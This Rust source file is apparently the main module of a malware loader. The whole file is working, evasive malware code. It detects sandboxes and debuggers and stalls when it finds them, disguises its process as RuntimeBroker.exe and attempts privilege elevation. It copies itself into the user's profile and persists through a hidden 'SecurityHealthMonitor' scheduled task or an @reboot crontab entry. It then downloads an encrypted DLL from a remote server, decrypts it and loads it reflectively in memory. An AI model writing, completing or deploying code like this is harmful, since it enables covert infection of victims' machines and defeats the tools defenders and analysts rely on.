mod config;
mod dll_fetch;
mod elevation;
mod pe_loader;
mod sleep_obfuscation;

use config::LoaderConfig;
use obfstr::obfstr;
use std::env;

fn main() {
    let args: Vec<String> = env::args().collect();
    let is_boot = args.iter().any(|a| a == "--boot");

    // 1. Parse injected config from binary
    let (injected, raw_json) = match parse_injected_config() {
        Some((cfg, json)) => (cfg, json),
        None => {
            eprintln!("{}", obfstr!("[!] Configuration error"));
            std::process::exit(1);
        }
    };

    let loader_cfg = LoaderConfig::from_injected(injected, raw_json);

    // 2. Anti-analysis: sandbox + debugger detection (BEFORE any persistence/IOCs)
    //    Skip uptime check on boot to avoid self-kill on autostart
    if is_sandbox(is_boot) || check_debugger() {
        // In sandbox/debugger: execute benign behavior then exit cleanly
        std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
        std::process::exit(0);
    }

    // 3. PEB spoofing — mask image path BEFORE any external calls
    elevation::spoof_peb("C:\\Windows\\System32\\RuntimeBroker.exe");

    // 4. Elevation attempt (only if config requires admin)
    if loader_cfg.require_admin {
        let exe = env::current_exe()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_default();
        if !exe.is_empty() {
            let _ = elevation::try_elevate(&exe);
        }
        // Degrade gracefully if elevation fails
    }

    // 5. Persistence (only after confirming we're not in a sandbox)
    if let Some(path) = loader_cfg.copy_to_path.as_deref() {
        if !path.is_empty() {
            copy_and_relaunch(path);
        }
    }
    if loader_cfg.enable_persistence {
        install_persistence();
    }

    // 6. Decrypt AES key
    let mut aes_key = match dll_fetch::decrypt_aes_key(&loader_cfg.encrypted_aes_key, &loader_cfg.rsa_private_key) {
        Ok(k) => k,
        Err(_) => {
            eprintln!("{}", obfstr!("[!] Initialization failed"));
            std::process::exit(1);
        }
    };

    // 7. Download and decrypt core DLL
    let download_url = loader_cfg.download_url();

    let rt = match tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
    {
        Ok(rt) => rt,
        Err(_) => {
            eprintln!("{}", obfstr!("[!] Runtime error"));
            std::process::exit(1);
        }
    };

    let dll_bytes = match rt.block_on(dll_fetch::download_core(&download_url)) {
        Ok(encrypted) => {
            match dll_fetch::decrypt_dll(&encrypted, &aes_key) {
                Ok(decrypted) => decrypted,
                Err(_) => {
                    eprintln!("{}", obfstr!("[!] Decryption failed"));
                    std::process::exit(1);
                }
            }
        }
        Err(_) => {
            eprintln!("{}", obfstr!("[!] Network error"));
            std::process::exit(1);
        }
    };

    // 8. Zeroize AES key from memory (prevents LLVM from optimizing away the wipe)
    use zeroize::Zeroize;
    aes_key.zeroize();

    // 9. Validate PE/ELF header
    if dll_bytes.len() < 2 {
        std::process::exit(1);
    }

    #[cfg(target_os = "windows")]
    if dll_bytes[0] != 0x4D || dll_bytes[1] != 0x5A {
        std::process::exit(1);
    }

    #[cfg(target_os = "linux")]
    if dll_bytes[0] != 0x7F || dll_bytes[1] != 0x45 {
        std::process::exit(1);
    }

    // 10. Reflective load (Module Stomping: RW→memcpy→RX, never RWX)
    let entry_fn = match unsafe { pe_loader::reflective_load(&dll_bytes) } {
        Ok(f) => f,
        Err(_) => {
            eprintln!("{}", obfstr!("[!] Load failed"));
            std::process::exit(1);
        }
    };

    // 11. Call entry point with config JSON
    let config_bytes = loader_cfg.config_json.as_bytes();

    // 12. Obfuscated sleep (random 1-5s delay, encrypts sensitive data via isolated thread)
    {
        // Register config JSON for sleep-time encryption
        unsafe {
            sleep_obfuscation::register_region(
                config_bytes.as_ptr() as *mut u8,
                config_bytes.len(),
            );
        }
        let delay_ms = 1000 + (rand::random::<u64>() % 4000);
        sleep_obfuscation::obfuscated_sleep(std::time::Duration::from_millis(delay_ms));
    }

    // 13. Call core_main
    entry_fn(config_bytes.as_ptr(), config_bytes.len());

    // Should not return, but if it does:
    std::process::exit(0);
}

// ── Config Injection ──────────────────────────────────────────────────

use libra_common::models::{InjectedConfig, CONFIG_MAGIC};

fn parse_injected_config() -> Option<(InjectedConfig, String)> {
    let exe_path = env::current_exe().ok()?;
    let data = std::fs::read(&exe_path).ok()?;

    if data.len() < CONFIG_MAGIC.len() + 4 {
        return None;
    }

    let magic_pos = data
        .windows(CONFIG_MAGIC.len())
        .rposition(|w| w == CONFIG_MAGIC.as_slice())?;

    let pos = magic_pos + CONFIG_MAGIC.len();
    if pos + 4 > data.len() {
        return None;
    }

    let len_bytes: [u8; 4] = data[pos..pos + 4].try_into().ok()?;
    let json_len = u32::from_le_bytes(len_bytes) as usize;
    let json_start = pos + 4;

    if json_start + json_len > data.len() {
        return None;
    }

    let json_bytes = &data[json_start..json_start + json_len];
    let json_str = std::str::from_utf8(json_bytes).ok()?;
    let config: InjectedConfig = serde_json::from_str(json_str).ok()?;

    Some((config, json_str.to_string()))
}

// ── Persistence (lightweight, no libra-modules dependency) ────────────

fn copy_and_relaunch(relative_path: &str) {
    let current_exe = match env::current_exe() {
        Ok(e) => e,
        Err(_) => return,
    };
    let current_dir = current_exe.parent().unwrap_or(std::path::Path::new("."));

    #[cfg(target_os = "windows")]
    let target_dir = {
        let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Roaming".into());
        std::path::PathBuf::from(appdata).join(relative_path)
    };
    #[cfg(not(target_os = "windows"))]
    let target_dir = {
        let home = env::var("HOME").unwrap_or_else(|_| "/tmp".into());
        std::path::PathBuf::from(home).join(".local/share").join(relative_path)
    };

    if current_dir.canonicalize().ok() == target_dir.canonicalize().ok() {
        return;
    }

    let target_exe = target_dir.join(current_exe.file_name().unwrap_or_default());
    if std::fs::create_dir_all(&target_dir).is_err() {
        std::process::exit(0);
    }
    if std::fs::copy(&current_exe, &target_exe).is_err() {
        std::process::exit(0);
    }

    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        let _ = std::process::Command::new(&target_exe)
            .arg("--boot")
            .creation_flags(0x08000000)
            .spawn();
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = std::process::Command::new(&target_exe)
            .arg("--boot")
            .spawn();
    }

    std::process::exit(0);
}

fn install_persistence() {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        let exe = match env::current_exe() {
            Ok(e) => e.to_string_lossy().to_string(),
            Err(_) => return,
        };
        let _ = std::process::Command::new("schtasks.exe")
            .args(["/create", "/tn", "SecurityHealthMonitor", "/tr", &exe, "/sc", "onlogon", "/rl", "highest", "/f"])
            .creation_flags(0x08000000)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
    }
    #[cfg(not(target_os = "windows"))]
    {
        let exe = match env::current_exe() {
            Ok(e) => e.to_string_lossy().to_string(),
            Err(_) => return,
        };
        let cron_line = format!("@reboot {} >/dev/null 2>&1", exe);
        let cmd = format!("(crontab -l 2>/dev/null; echo '{}') | crontab -", cron_line);
        let _ = std::process::Command::new("bash")
            .args(["-c", &cmd])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
    }
}

// ── Anti-analysis (inline, no libra-modules dependency) ───────────────

fn is_sandbox(skip_uptime: bool) -> bool {
    check_cpu_cores()
        || check_memory()
        || (!skip_uptime && check_uptime())
        || check_debugger()
}

fn check_cpu_cores() -> bool {
    match std::thread::available_parallelism() {
        Ok(n) => n.get() < 2,
        Err(_) => false,
    }
}

fn check_memory() -> bool {
    use sysinfo::System;
    let sys = System::new_with_specifics(
        sysinfo::RefreshKind::nothing()
            .with_memory(sysinfo::MemoryRefreshKind::everything()),
    );
    let total_mb = sys.total_memory() / (1024 * 1024);
    total_mb < 2048
}

fn check_uptime() -> bool {
    let uptime = get_system_uptime_secs();
    uptime < 300
}

// ── Anti-debug ────────────────────────────────────────────────────────

fn check_debugger() -> bool {
    #[cfg(target_os = "windows")]
    {
        check_peb_being_debugged()
            || check_nt_global_flag()
            || check_hardware_breakpoints()
            || check_remote_debugger()
            || check_parent_process()
    }
    #[cfg(not(target_os = "windows"))]
    {
        check_ptrace_traceme() || check_tracer_pid()
    }
}

/// PEB->BeingDebugged (byte at PEB+0x2): set to 1 when process is debugged.
#[cfg(target_os = "windows")]
fn check_peb_being_debugged() -> bool {
    unsafe {
        let peb: *const u8;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
        if peb.is_null() { return false; }
        *(peb.add(2)) != 0
    }
}

/// Check if parent process is a known analysis/debugging tool.
#[cfg(target_os = "windows")]
fn check_parent_process() -> bool {
    use std::os::windows::process::CommandExt;

    // Get parent PID via wmic
    let output = std::process::Command::new("wmic")
        .args(["process", "where", &format!("ProcessId={}", std::process::id()), "get", "ParentProcessId", "/format:csv"])
        .creation_flags(0x08000000)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .output();

    let parent_pid = match output {
        Ok(o) => {
            let text = String::from_utf8_lossy(&o.stdout);
            // Parse: Node,ParentProcessId\n,12345\n
            text.lines()
                .nth(2)
                .and_then(|l| l.split(',').last())
                .and_then(|s| s.trim().parse::<u32>().ok())
                .unwrap_or(0)
        }
        Err(_) => return false,
    };

    if parent_pid == 0 { return false; }

    // Get parent process name
    let name_output = std::process::Command::new("wmic")
        .args(["process", "where", &format!("ProcessId={}", parent_pid), "get", "Name", "/format:csv"])
        .creation_flags(0x08000000)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .output();

    if let Ok(o) = name_output {
        let text = String::from_utf8_lossy(&o.stdout);
        if let Some(name_line) = text.lines().nth(2) {
            if let Some(name) = name_line.split(',').last() {
                let name_lower = name.trim().to_lowercase();
                // Known analysis/debugging tool process names
                const ANALYSIS_TOOLS: &[&str] = &[
                    "x64dbg", "x32dbg", "ollydbg", "windbg", "ida", "ida64", "idag",
                    "procmon", "procexp", "processhacker", "dumpcap", "wireshark",
                    "vmtoolsd", "vmwaretray", "vmwareuser", "vboxservice", "vboxtray",
                    "cheatengine", "httpdebugger", "fiddler", "burpsuite",
                    "immunity", "radare2", "ghidra",
                ];
                for tool in ANALYSIS_TOOLS {
                    if name_lower.contains(tool) {
                        return true;
                    }
                }
            }
        }
    }
    false
}

/// PEB->NtGlobalFlag: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
/// Set by default when a process is started under a debugger.
#[cfg(target_os = "windows")]
fn check_nt_global_flag() -> bool {
    unsafe {
        // Read PEB via TEB (gs:0x60 on x64)
        let peb: *const u8;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
        if peb.is_null() {
            return false;
        }
        // NtGlobalFlag is at PEB+0xBC on x64
        let nt_global_flag = *(peb.add(0xBC) as *const u32);
        const FLG_HEAP_ENABLE_TAIL_CHECK: u32 = 0x10;
        const FLG_HEAP_ENABLE_FREE_CHECK: u32 = 0x20;
        const FLG_HEAP_VALIDATE_PARAMETERS: u32 = 0x40;
        nt_global_flag & (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS) != 0
    }
}

/// Check hardware breakpoints by reading DR0-DR3 via GetThreadContext.
/// Debuggers set hardware breakpoints by writing to debug registers.
#[cfg(target_os = "windows")]
fn check_hardware_breakpoints() -> bool {
    use std::mem;

    #[repr(C, align(16))]
    struct Context64 {
        _p1_home: u64, _p2_home: u64, _p3_home: u64, _p4_home: u64,
        _p5_home: u64, _p6_home: u64, _context_flags: u32,
        _mx_csr: u32,
        _seg_cs: u16, _seg_ds: u16, _seg_es: u16, _seg_fs: u16, _seg_gs: u16, _seg_ss: u16,
        _eflags: u32, _dr0: u64, _dr1: u64, _dr2: u64, _dr3: u64,
        _dr6: u64, _dr7: u64,
        _rax: u64, _rcx: u64, _rdx: u64, _rbx: u64,
        _rsp: u64, _rbp: u64, _rsi: u64, _rdi: u64,
        _r8: u64, _r9: u64, _r10: u64, _r11: u64,
        _r12: u64, _r13: u64, _r14: u64, _r15: u64,
        _rip: u64,
        // ... rest omitted, we only need Dr0-Dr3
    }

    extern "system" {
        fn GetThreadContext(hthread: *mut std::ffi::c_void, lpcontext: *mut Context64) -> i32;
        fn GetCurrentThread() -> *mut std::ffi::c_void;
    }

    unsafe {
        let mut ctx: Context64 = mem::zeroed();
        // CONTEXT_DEBUG_REGISTERS = 0x00100010
        // CONTEXT_ALL = 0x0010001F (we need DR flags)
        ctx._context_flags = 0x00100010;
        if GetThreadContext(GetCurrentThread(), &mut ctx) != 0 {
            // If any debug register is set, a debugger is present
            return ctx._dr0 != 0 || ctx._dr1 != 0 || ctx._dr2 != 0 || ctx._dr3 != 0;
        }
        false
    }
}

/// Check IsDebuggerPresent and NtQueryInformationProcess(DebugPort)
#[cfg(target_os = "windows")]
fn check_remote_debugger() -> bool {
    unsafe {
        extern "system" {
            fn IsDebuggerPresent() -> i32;
            fn LoadLibraryA(lpFileName: *const u8) -> *mut u8;
            fn GetProcAddress(hModule: *mut u8, lpProcName: *const u8) -> *mut u8;
        }

        if IsDebuggerPresent() != 0 {
            return true;
        }

        // NtQueryInformationProcess(ProcessDebugPort = 7)
        type NtQIP = unsafe extern "system" fn(
            *mut std::ffi::c_void, u32, *mut u8, u32, *mut u32,
        ) -> i32;

        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
        if ntdll.is_null() {
            return false;
        }
        let proc = GetProcAddress(ntdll, b"NtQueryInformationProcess\0".as_ptr());
        if proc.is_null() {
            return false;
        }
        let nt_query: NtQIP = std::mem::transmute(proc);
        let mut debug_port: usize = 0;
        // ProcessDebugPort = 7
        let status = nt_query(
            std::ptr::null_mut(),
            7,
            &mut debug_port as *mut usize as *mut u8,
            std::mem::size_of::<usize>() as u32,
            std::ptr::null_mut(),
        );
        status == 0 && debug_port != 0
    }
}

/// Linux: check if /proc/self/status shows TracerPid != 0
#[cfg(target_os = "linux")]
fn check_tracer_pid() -> bool {
    if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
        for line in status.lines() {
            if line.starts_with("TracerPid:") {
                let pid_str = line["TracerPid:".len()..].trim();
                if let Ok(pid) = pid_str.parse::<u32>() {
                    return pid != 0;
                }
            }
        }
    }
    false
}

/// Linux: try ptrace(PTRACE_TRACEME) — fails if already traced
#[cfg(target_os = "linux")]
fn check_ptrace_traceme() -> bool {
    const PTRACE_TRACEME: i64 = 0;
    unsafe {
        // If we're already being traced, ptrace returns -1
        libc::ptrace(PTRACE_TRACEME, 0, 0, 0) == -1
    }
}

fn get_system_uptime_secs() -> u64 {
    #[cfg(target_os = "linux")]
    {
        if let Ok(content) = std::fs::read_to_string("/proc/uptime") {
            if let Some(uptime_str) = content.split_whitespace().next() {
                if let Ok(uptime) = uptime_str.parse::<f64>() {
                    return uptime as u64;
                }
            }
        }
        3600
    }
    #[cfg(target_os = "windows")]
    {
        use std::process::Command;
        use std::os::windows::process::CommandExt;
        if let Ok(output) = Command::new("wmic")
            .args(["os", "get", "lastbootuptime", "/format:csv"])
            .creation_flags(0x08000000)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::null())
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            if let Some(line) = text.lines().nth(2) {
                let parts: Vec<&str> = line.split(',').collect();
                if parts.len() >= 2 {
                    let boot_time = parts[1].trim();
                    if let Ok(bt) = parse_wmi_datetime(boot_time) {
                        let now = std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .unwrap_or_default()
                            .as_secs();
                        return now.saturating_sub(bt);
                    }
                }
            }
        }
        3600
    }
    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    {
        3600
    }
}

#[cfg(target_os = "windows")]
fn parse_wmi_datetime(s: &str) -> Result<u64, ()> {
    if s.len() < 14 {
        return Err(());
    }
    let year: i32 = s[0..4].parse().map_err(|_| ())?;
    let month: u32 = s[4..6].parse().map_err(|_| ())?;
    let day: u32 = s[6..8].parse().map_err(|_| ())?;
    let hour: u32 = s[8..10].parse().map_err(|_| ())?;
    let min: u32 = s[10..12].parse().map_err(|_| ())?;
    let sec: u32 = s[12..14].parse().map_err(|_| ())?;

    let days_before_month: [u32; 12] = [0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334];
    let is_leap = |y: i32| y % 4 == 0 && (y % 100 != 0 || y % 400 == 0);
    let days_since_epoch = (year as u64 - 1970) * 365
        + (year as u64 - 1969) / 4
        - (year as u64 - 1901) / 100
        + (year as u64 - 1601) / 400
        + days_before_month[(month - 1) as usize] as u64
        + if month > 2 && is_leap(year) { 1 } else { 0 }
        + (day - 1) as u64;
    Ok(days_since_epoch * 86400 + hour as u64 * 3600 + min as u64 * 60 + sec as u64)
}

